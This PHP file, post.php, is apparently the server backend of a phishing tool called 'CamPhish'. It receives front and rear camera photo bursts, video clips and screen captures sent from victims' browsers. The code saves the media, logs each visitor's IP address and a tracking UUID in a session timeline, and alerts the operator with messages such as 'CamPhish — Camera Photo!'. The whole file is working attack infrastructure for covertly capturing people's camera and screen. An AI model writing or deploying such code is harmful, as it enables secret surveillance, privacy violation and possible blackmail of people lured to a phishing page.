<?php
// post.php — receives camera snapshots, video clips, and screen captures
require_once __DIR__ . '/alerts.php';
require_once __DIR__ . '/helpers.php';

$cfg  = include __DIR__ . '/config.php';
$date = date('dMYHis');
$uuid = ($cfg['session_tracking'] ?? true) ? get_visitor_uuid() : 'unknown';
$ip   = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown')[0]);

$save_dir = __DIR__ . '/logs/snapshots';
$log_dir  = __DIR__ . '/logs';
if (!is_dir($save_dir)) mkdir($save_dir, 0777, true);
if (!is_dir($log_dir))  mkdir($log_dir, 0755, true);

// ═══════════════════════════════════════════════════════════════════
//  1. Camera photo / burst frame
// ═══════════════════════════════════════════════════════════════════
if (!empty($_POST['cat'])) {
    $imageData   = $_POST['cat'];
    $burst_index = isset($_POST['burst_index']) ? intval($_POST['burst_index']) : 0;
    $cam_facing  = isset($_POST['cam_facing'])  ? $_POST['cam_facing'] : 'user';
    $shot_type   = isset($_POST['shot_type'])   ? $_POST['shot_type']  : 'burst';

    $filteredData  = substr($imageData, strpos($imageData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    if (!$unencodedData) { http_response_code(400); exit(); }

    $label    = $cam_facing === 'environment' ? 'rear' : 'front';
    $filepath = $save_dir . '/cam_' . $label . '_' . $date . '_' . sprintf('%03d', $burst_index) . '.jpg';
    file_put_contents($filepath, $unencodedData);
    error_log("Received\r\n", 3, $log_dir . '/Log.log');

    // Session timeline
    if ($uuid !== 'unknown') {
        $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
        if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
        file_put_contents($uuid_dir . '/timeline.log', "[" . date('d-M-Y H:i:s') . "] PHOTO | {$label} #{$burst_index}\n", FILE_APPEND);
    }

    // Alert on first burst frame only
    if ($burst_index === 0) {
        $msg = "📸 <b>CamPhish — Camera Photo!</b>\n📷 Camera: <code>{$label}</code>\n📡 IP: <code>{$ip}</code>\n🕐 " . date('d-M-Y H:i:s') . "\n<i>Check logs/snapshots/ for photos</i>";
        dispatch_alert('photo', $msg, ['camera' => $label, 'ip' => $ip, 'uuid' => $uuid], $filepath);
        signal_autokill();
    }
}

// ═══════════════════════════════════════════════════════════════════
//  2. Video clip (base64 webm)
// ═══════════════════════════════════════════════════════════════════
if (!empty($_POST['video_clip'])) {
    $videoData    = $_POST['video_clip'];
    $cam_facing   = isset($_POST['cam_facing']) ? $_POST['cam_facing'] : 'user';
    $label        = $cam_facing === 'environment' ? 'rear' : 'front';
    $filteredData = substr($videoData, strpos($videoData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $filepath     = $save_dir . '/vid_' . $label . '_' . $date . '.webm';
    file_put_contents($filepath, $unencodedData);
    error_log("Received\r\n", 3, $log_dir . '/Log.log');

    if ($uuid !== 'unknown') {
        $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
        if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
        file_put_contents($uuid_dir . '/timeline.log', "[" . date('d-M-Y H:i:s') . "] VIDEO | {$label}\n", FILE_APPEND);
    }

    $msg = "🎥 <b>CamPhish — Video Clip!</b>\n📷 Camera: <code>{$label}</code>\n📡 IP: <code>{$ip}</code>\n📁 <i>Saved: " . basename($filepath) . "</i>";
    dispatch_alert('video', $msg, ['camera' => $label, 'ip' => $ip, 'file' => basename($filepath), 'uuid' => $uuid]);
}

// ═══════════════════════════════════════════════════════════════════
//  3. Screen capture (html2canvas / getDisplayMedia)
// ═══════════════════════════════════════════════════════════════════
if (!empty($_POST['screen_shot'])) {
    $screen_dir = __DIR__ . '/logs/screens';
    if (!is_dir($screen_dir)) mkdir($screen_dir, 0755, true);

    $filteredData  = substr($_POST['screen_shot'], strpos($_POST['screen_shot'], ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $filepath      = $screen_dir . '/screen_' . $date . '.png';
    file_put_contents($filepath, $unencodedData);

    if ($uuid !== 'unknown') {
        $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
        if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
        file_put_contents($uuid_dir . '/timeline.log', "[" . date('d-M-Y H:i:s') . "] SCREEN\n", FILE_APPEND);
    }

    $msg = "🖥 <b>CamPhish — Screen Capture!</b>\n📡 IP: <code>{$ip}</code>\n📁 <i>" . basename($filepath) . "</i>";
    dispatch_alert('screen', $msg, ['ip' => $ip, 'uuid' => $uuid], $filepath);
}

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
